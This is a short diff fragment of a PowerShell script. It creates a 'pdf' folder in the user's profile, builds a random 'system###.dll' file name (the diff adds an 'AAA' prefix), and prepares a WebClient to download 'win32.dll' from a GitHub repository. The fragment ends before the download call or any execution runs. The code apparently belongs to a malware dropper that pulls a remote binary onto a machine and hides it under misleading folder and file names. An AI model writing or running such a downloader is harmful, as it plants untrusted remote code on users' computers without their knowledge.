@@ -3,7 +3,7 @@ $path_new = $env:USERPROFILE+"\pdf\";
 If (-not (Test-Path $path_new)){
 	New-Item -Path $path_new -ItemType Directory | Out-Null;
 }
-$file = "system"+ (Get-Random -Maximum 999) + ".dll"
+$file = "AAAsystem"+ (Get-Random -Maximum 999) + ".dll"
 $location = $path_new + $file;
 $uri = "https://github.com/iskww/atlasgov/raw/main/win32.dll";
 $cli = New-Object System.Net.WebClient;
